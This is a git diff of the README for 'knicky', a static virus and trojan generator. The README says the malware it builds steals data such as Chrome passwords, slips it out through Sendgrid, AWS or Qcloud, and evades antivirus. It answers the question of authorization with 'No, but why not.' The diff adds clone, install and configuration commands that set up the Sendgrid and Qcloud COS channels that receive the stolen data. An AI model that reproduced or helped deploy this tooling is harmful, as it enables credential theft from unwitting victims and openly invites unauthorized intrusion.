@@ -4,14 +4,14 @@ Yet another module-based static virus generator
 There will be a picture
 ```
 ## Little FAQ
-**What the fuck is static virus??**  
+**WTF is static virus?**  
 Static virus is the virus/trojan that has already had all its functions been defined and would not be controlled by server side. Instead, it would only send critical information (Chrome password, etc.) slowly and predictedly to server side by tricky ways (Sendgrid, AWS, Qcloud, etc.).  
 
  
-**Why use it??**  
+**Why use it?**  
 Because the virus generated could always bypass the anti-virus softwares. If not, then make some modification on the modules you are using.  
 
-**Am I authorized to hack others' computer??**  
+**Am I authorized to hack others' computer?**  
 No, but why not.
 
 
@@ -21,8 +21,26 @@ $ git clone https://github.com/shouc/knicky.git && cd knicky
 $ python -m pip install -r requirements/main.txt --user
 ```
 ## Small Examples
-#### Using Qcloud (腾讯云)
+
 ##### 1. Initialize the Module
+
+###### Using Sendgrid
+Note: *See the help information about such module*
+```bash
+$ python cli.py sgUpdate --help
+```
+Note: *Replace the information in <> in accordance to your personal information after creating a COS bucket in the panel*
+```
+$ python -m pip install -r requirements/sendgrid.txt --user
+$ python cli.py sgUpdate\
+    --user <receiving email address>\
+    --password <receiving email password>\
+    --server <receiving email pop3 server>\
+    --apiKey <sendgrid api key>\
+    -b True
+```
+
+###### Using Qcloud COS (腾讯云)
 Note: *See the help information about such module*
 ```bash
 $ python cli.py qcloudUpdate --help
@@ -30,7 +48,12 @@ $ python cli.py qcloudUpdate --help
 Note: *Replace the information in <> in accordance to your personal information after creating a COS bucket in the panel*
 ```
 $ python -m pip install -r requirements/qcloud.txt --user
-$ python cli.py qcloudUpdate --secretID <SecretID> --secretKey <SecretKey> --region <BucketRegion> --bucket <BucketName> -b True
+$ python cli.py qcloudUpdate\
+    --secretID <SecretID>\
+    --secretKey <SecretKey>\
+    --region <BucketRegion>\
+    --bucket <BucketName>\
+    -b True
 ```
 
 ##### 2. Have an Overview on Components
